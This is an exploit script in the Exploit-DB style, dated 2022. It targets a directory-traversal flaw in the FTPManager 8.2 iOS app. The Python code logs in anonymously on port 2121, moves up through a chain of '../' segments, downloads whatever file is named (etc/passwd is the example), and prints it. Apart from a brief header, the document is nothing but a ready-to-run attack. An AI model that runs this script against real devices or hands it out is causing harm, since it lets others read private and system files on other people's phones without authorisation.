# Exploit Title: FTPManager 8.2 Local File inclusion (ftp) python
# Date: Sep 6, 2022
# Exploit Author: Chokri Hammedi
# Vendor Homepage: https://www.skyjos.com/
# Software Link: https://apps.apple.com/us/app/ftpmanager-ftp-sftp-client/id525959186
# Version: 8.2
# Tested on: ios 15.6


from ftplib import FTP
import argparse

help = " FTPManager 8.2 Local File inclusion by chokri hammedi"
parser = argparse.ArgumentParser(description=help)
parser.add_argument("--target", help="Target IP", required=True)
parser.add_argument("--file", help="File To Open eg: etc/passwd")

args = parser.parse_args()


ip = args.target
port = 2121 # Default Port
files = args.file



ftpConnection = FTP()
ftpConnection.connect(host=ip, port=port)
ftpConnection.login();

def downloadFile():
        ftpConnection.cwd('/../../../../../../../../../../../../../../../../')
        ftpConnection.retrbinary(f"RETR {files}", open('data.txt', 'wb').write)
        ftpConnection.close()
        file = open('data.txt', 'r')
        print (f"[***] The contents of {files}\n")
        print (file.read())

downloadFile()
        
